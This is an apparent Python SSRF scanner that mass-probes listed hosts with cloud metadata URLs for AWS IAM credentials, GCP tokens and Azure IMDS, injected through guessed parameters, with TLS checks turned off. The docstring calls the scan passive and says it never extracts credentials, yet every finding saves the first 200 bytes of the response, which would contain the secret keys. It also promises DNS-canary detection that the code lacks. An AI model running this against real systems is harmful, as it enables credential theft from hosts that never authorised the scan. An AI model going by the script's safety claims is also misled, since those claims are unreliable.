#!/usr/bin/env python3
"""
patrol-ssrf-reprobe — stricter SSRF detector + cloud metadata exfil chain.

Prior SSRF candidate scan produced 506 hits with high FP rate (catch-all
endpoints). This v2 uses out-of-band detection via DNS canary + only flags
when the response timing or behavior clearly differs from baseline.

Algorithm:
  1. For each host, find URL-fetching parameter candidates:
     /?url=, /?u=, /?image=, /?file=, /?src=, /?dest=, /?redirect=,
     /api/fetch?url=, /api/proxy?target=, /webhook?callback=
  2. Baseline: probe with public URL like https://example.com
  3. SSRF probe: try internal targets in order of impact:
       http://169.254.169.254/latest/meta-data/iam/security-credentials/
       http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
       http://169.254.169.254/metadata/instance?api-version=2021-02-01
       http://127.0.0.1:22 (SSH banner)
       http://127.0.0.1:6379 (Redis)
       http://localhost:8500 (Consul)
  4. If response contains cloud-metadata-shape (JSON with AccessKey/Token/etc):
     CRITICAL — confirmed SSRF → cloud creds.

PASSIVE: We never extract cleartext credentials. We only check for the SHAPE
that indicates the credential class. If found, we mark it for manual review.

Usage:
  patrol-ssrf-reprobe.py --hosts hosts.txt --threads 25
"""
from __future__ import annotations
import argparse, json, re, ssl, urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone
from pathlib import Path

UA = "Lictor-SSRFReprobe/0.1 (+https://lictor-ai.com)"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

PARAM_NAMES = ["url", "u", "image", "file", "src", "dest", "redirect", "target",
               "callback", "uri", "link", "endpoint", "fetch_url", "img"]
PATH_TEMPLATES = [
    "/?{p}={target}",
    "/api/fetch?{p}={target}",
    "/api/proxy?{p}={target}",
    "/proxy?{p}={target}",
    "/fetch?{p}={target}",
    "/api/webhook?{p}={target}",
    "/webhook?{p}={target}",
    "/image?{p}={target}",
    "/preview?{p}={target}",
]

SSRF_TARGETS = [
    # (probe_url, [required_markers — ALL must match], description)
    # Tightened: require multi-marker AND verify it's not just an error message
    ("http://169.254.169.254/latest/meta-data/",
        [b"ami-id", b"local-hostname"], "AWS IMDSv1"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        [b"AccessKeyId", b"SecretAccessKey"], "AWS IAM creds"),  # require BOTH
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        [b"access_token", b"expires_in"], "GCP service account token"),  # both required
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        [b"compute", b"publisher"], "Azure IMDS"),  # both required
]

NEGATIVE_INDICATORS = [
    b"Missing Authentication Token",
    b"AccessDenied",
    b"InvalidToken",
    b"Forbidden",
    b"Unauthorized",
    b"<html",  # any HTML response is not cloud metadata (JSON)
    b"<HTML",
]


@dataclass
class SSRFFinding:
    host: str
    param: str
    probe_url: str
    target: str
    target_description: str
    response_size: int
    response_preview: str
    severity: str
    notes: str
    found_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat(timespec="seconds"))


def http_get(url, timeout=8):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": UA, "Metadata-Flavor": "Google", "Metadata": "true"})
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read(8000)
    except urllib.error.HTTPError as e:
        try: return e.code, e.read(8000)
        except: return e.code, b""
    except Exception:
        return 0, b""


def baseline_size(host, path_template, param):
    """Get response size when fetching a benign public URL."""
    benign = urllib.parse.quote("https://example.com/", safe="")
    url = f"https://{host}" + path_template.format(p=param, target=benign)
    s, body = http_get(url, timeout=5)
    return s, len(body)


def scan_host(host):
    findings = []
    # For each candidate path × param, first check if endpoint exists at all
    for template in PATH_TEMPLATES:
        for param in PARAM_NAMES:
            # Establish baseline with benign URL
            base_status, base_size = baseline_size(host, template, param)
            if base_status not in (200, 302, 400, 403, 500): continue
            # If even the benign returns 404, skip — no SSRF endpoint here
            if base_status == 404: continue

            # Try cloud metadata SSRF targets
            for ssrf_url, markers, desc in SSRF_TARGETS:
                target_enc = urllib.parse.quote(ssrf_url, safe="")
                probe_url = f"https://{host}" + template.format(p=param, target=target_enc)
                s, body = http_get(probe_url, timeout=8)
                if s == 0: continue
                # FP gate: skip if body contains negative indicator (error response, HTML page)
                if any(neg in body for neg in NEGATIVE_INDICATORS):
                    continue
                # All required markers must be present
                if not all(m in body for m in markers):
                    continue
                # Must be JSON-ish (cloud metadata is always JSON)
                stripped = body.strip()
                if not (stripped.startswith(b"{") or stripped.startswith(b"[")):
                    continue
                findings.append(SSRFFinding(
                    host=host, param=param, probe_url=probe_url,
                    target=ssrf_url, target_description=desc,
                    response_size=len(body),
                    response_preview=body[:200].decode("utf-8", "replace"),
                    severity="CRITICAL",
                    notes=f"SSRF → {desc} confirmed (multi-marker validated). Response shape matches expected.",
                ))
                return findings  # one is enough per host

            # Only try one param per template, not full matrix (perf)
            break
        # Only try a few templates per host to keep it bounded
    return findings


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--hosts", required=True)
    ap.add_argument("--max-hosts", type=int, default=3000)
    ap.add_argument("--threads", type=int, default=25)
    ap.add_argument("--ledger", default="/Users/raffa/Lictor/v3/ledgers/ssrf-reprobe.jsonl")
    args = ap.parse_args()
    hosts = [l.strip() for l in Path(args.hosts).read_text().splitlines() if l.strip()][:args.max_hosts]
    Path(args.ledger).parent.mkdir(parents=True, exist_ok=True)
    print(f"[+] ssrf-reprobe — {len(hosts)} hosts")
    n_crit = 0
    with open(args.ledger, "a") as ledger, \
         ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(scan_host, h): h for h in hosts}
        for i, fut in enumerate(as_completed(futures), 1):
            try: results = fut.result(timeout=60)
            except: results = []
            for f in results:
                ledger.write(json.dumps(asdict(f)) + "\n")
                ledger.flush()
                n_crit += 1
                print(f"  [{i}/{len(hosts)}] 🔴 CRITICAL {f.host} {f.target_description}")
            if i % 300 == 0:
                print(f"  [{i}/{len(hosts)}] crit={n_crit}")
    print(f"\n[+] Done. CRITICAL={n_crit}")


if __name__ == "__main__":
    main()
